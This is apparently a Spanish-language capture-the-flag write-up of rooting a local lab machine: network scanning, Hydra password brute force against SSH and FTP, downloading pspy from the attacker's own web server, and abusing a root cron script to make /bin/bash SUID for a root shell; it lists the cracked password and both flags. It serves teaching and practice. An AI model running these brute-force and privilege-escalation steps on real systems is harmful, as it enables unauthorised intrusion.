
```bash
arp-scan -I eth0 --localnet
nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 10.0.2.15 -oN escaneo
hydra -l juan -P /usr/share/wordlists/rockyou.txt ssh://10.0.2.15
hydra -l juan -P /usr/share/wordlists/rockyou.txt ftp://10.0.2.15
ssh juan@10.0.2.15
python3 -m http.server 80
```

Primero de todo buscamos la IP de la máquina realizando un arp-scan, una vez tenemos su IP realizamos un nmap para ver los puertos abiertos![[Pasted image 20240301003017.png]]
Y vemos que tiene los puertos 21, 22, 80 abiertos![[Pasted image 20240301003121.png]]
Entramos en el puerto 80 y encontramos el usuario juan![[Pasted image 20240301003327.png]]
Entonces intentamos hacer un ataque de fuerza bruta con Hydra al protocolo ssh![[Pasted image 20240301003548.png]]
Y al cabo de un rato nos encuentra la contraseña que es alexis![[Pasted image 20240301003658.png]]
Como extra atacaré también el protocolo ftp![[Pasted image 20240301003903.png]]
Ahora que tenemos la contraseña entramos por ssh![[Pasted image 20240301004223.png]]
```shell
cat user.txt
curl -X GET http://10.0.2.4/pspy64 -o pspy64
chmod +x pspy64
cat /opt/check_for_install.sh
nano a.sh
chmod +x a.sh
cat a.sh
./a.sh
^C
bash -p
```
Y obtenemos la flag de user
![[Pasted image 20240301004302.png]]
Ahora usaremos el pspy para ver si hay algún proceso cron así que para ello levantamos un servidor en python y nos descargamos el archivo pspy.![[Pasted image 20240309131301.png]]
Ahora lo ejecutamos y nos encuentra el archivo check_for_install.sh que se está ejecutando cada cierto tiempo![[Pasted image 20240309131555.png]]
Ahora vemos el archivo check_for_install.sh que nos esta ejecutando un script con permisos sudo así que crearemos un script que nos de permisos sudo en la bash
![[Pasted image 20240309131803.png]]![[Pasted image 20240309132234.png]]
```bash
#!/bin/bash
while true :
do
    echo "chmod +s /bin/bash" >> /tmp/a.bash
done
```
Finalmente ejecutamos el comando por un minuto y vemos que tenemos la bash de root
![[Pasted image 20240309132608.png]]
Finamente obtenemos la flag de root
![[Pasted image 20240309132801.png]]
Flag de user: cb40b159c8086733d57280de3f97de30
Flag de root: eb9748b67f25e6bd202e5fa25f534d51
